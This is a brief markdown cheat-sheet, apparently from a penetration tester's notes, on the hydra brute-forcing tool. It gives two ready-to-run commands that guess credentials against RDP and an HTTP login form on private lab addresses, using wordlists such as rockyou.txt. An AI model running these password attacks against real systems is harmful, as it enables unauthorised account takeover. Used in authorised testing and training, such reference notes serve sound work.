---
tags:
  - tool
  - web
  - brute_forcing
---
# hydra

Brute force services

## Capabilities

```bash
# Brute force RDP
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202

# Brute force HTTP post request
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

Note: `L` and `P` are used for username and password respectively, lowercase either of them to specify a single value